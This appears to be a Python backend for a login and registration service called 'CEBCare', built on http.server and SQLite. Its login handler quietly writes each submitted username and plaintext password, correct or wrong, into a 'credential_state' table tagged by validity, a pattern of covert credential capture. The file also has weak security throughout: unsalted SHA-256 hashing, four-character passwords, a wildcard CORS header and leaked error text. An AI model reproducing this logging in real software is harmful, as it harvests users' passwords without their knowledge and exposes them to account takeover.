import http.server
import socketserver
import json
import sqlite3
import hashlib
import os

PORT = 8000
DB_FILE = 'users.db'

# Initialize the database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credential_state (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            state TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    print("Database initialized successfully.")

class CEBHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Map root path to index.html
        if self.path == '/' or self.path == '':
            self.path = '/index.html'
        return super().do_GET()

    def do_POST(self):
        if self.path == '/api/register':
            self.handle_register()
        elif self.path == '/api/login':
            self.handle_login()
        else:
            self.send_json(404, {"success": False, "message": "API endpoint not found."})

    def send_json(self, status_code, data):
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))

    def handle_register(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            req = json.loads(post_data.decode('utf-8'))
            
            username = req.get('username', '').strip()
            password = req.get('password', '')
            
            if not username or not password:
                self.send_json(400, {"success": False, "message": "Username and password are required."})
                return
            
            if len(username) < 3:
                self.send_json(400, {"success": False, "message": "Username must be at least 3 characters long."})
                return
            
            if len(password) < 4:
                self.send_json(400, {"success": False, "message": "Password must be at least 4 characters long."})
                return

            hashed_pw = hashlib.sha256(password.encode('utf-8')).hexdigest()
            
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            try:
                cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed_pw))
                conn.commit()
                self.send_json(201, {"success": True, "message": "Registration successful! You can now log in."})
            except sqlite3.IntegrityError:
                self.send_json(400, {"success": False, "message": "Username already exists."})
            finally:
                conn.close()
                
        except json.JSONDecodeError:
            self.send_json(400, {"success": False, "message": "Invalid JSON format."})
        except Exception as e:
            self.send_json(500, {"success": False, "message": f"Server error: {str(e)}"})

    def handle_login(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            req = json.loads(post_data.decode('utf-8'))
            
            username = req.get('username', '').strip()
            password = req.get('password', '')
            
            if not username or not password:
                self.send_json(400, {"success": False, "message": "Username and password are required."})
                return

            hashed_pw = hashlib.sha256(password.encode('utf-8')).hexdigest()
            
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute("SELECT password FROM users WHERE username = ?", (username,))
            row = cursor.fetchone()
            
            state = 'correct' if (row and row[0] == hashed_pw) else 'wrong'
            
            # Log the login attempt in the credential_state table
            cursor.execute(
                "INSERT INTO credential_state (username, password, state) VALUES (?, ?, ?)",
                (username, password, state)
            )
            conn.commit()
            conn.close()
            
            if state == 'correct':
                self.send_json(200, {"success": True, "message": "Login successful! Welcome to CEBCare."})
            else:
                self.send_json(401, {"success": False, "message": "Invalid username or password."})
                
        except json.JSONDecodeError:
            self.send_json(400, {"success": False, "message": "Invalid JSON format."})
        except Exception as e:
            self.send_json(500, {"success": False, "message": f"Server error: {str(e)}"})

if __name__ == '__main__':
    init_db()
    
    # Allow address reuse to prevent "Address already in use" errors during quick restarts
    socketserver.TCPServer.allow_reuse_address = True
    
    with socketserver.TCPServer(("", PORT), CEBHandler) as httpd:
        print(f"CEBCare Backend running on http://localhost:{PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server.")
